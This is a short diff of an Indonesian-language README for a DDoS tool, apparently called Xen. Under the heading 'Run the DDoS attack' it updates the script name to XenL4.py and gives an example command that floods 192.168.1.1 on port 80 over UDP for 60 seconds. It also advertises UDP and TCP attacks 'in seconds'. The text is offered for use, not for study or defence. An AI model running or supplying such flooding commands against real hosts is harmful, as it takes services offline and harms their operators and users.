@@ -49,11 +49,11 @@ python3 install.py
 ### **4️⃣ Jalankan Serangan DDoS**
 Gunakan perintah berikut:  
 ```bash
-python3 Xen.py <waktu> <ip> <port> <packet> <threads> <mode>
+python3 XenL4.py
 ```
 📝 **Contoh:**  
 ```bash
-python3 Xena.py 60 192.168.1.1 80 1024 5 udp
+python3 XenL4.py 60 192.168.1.1 80 1024 5 udp
 ```
 > 🔥 **UDP & TCP Attack dalam hitungan detik!**
 
